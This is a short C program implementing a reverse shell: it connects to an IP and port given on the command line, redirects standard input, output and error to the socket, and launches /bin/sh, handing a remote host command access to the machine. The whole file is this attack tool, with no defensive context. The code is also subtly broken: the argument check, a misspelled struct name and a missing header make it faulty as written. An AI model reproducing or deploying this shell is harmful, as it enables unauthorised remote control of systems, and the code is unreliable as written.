#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("[-] Usage ./%s <IP> <PORT>", argv[0]);
        return -1;
    }
    const char* IP = argv[1];
    const char* PORT = argv[2];

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(PORT));
    inet_aton(IP, &addr.sin_addr);

    // sockfd: socket descriptor, an integer (like a file-handle), protocol

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);



    connect(sockfd, (struct sockadr *)&addr, sizeof(addr));

    // 0 -> stdin, 1-> stdout, 2-> stderror

    for (int i = 0; i < 3; i++) {
        dup2(sockfd, i);
    }

    execve("/bin/sh", NULL, NULL);

    return 0;

}
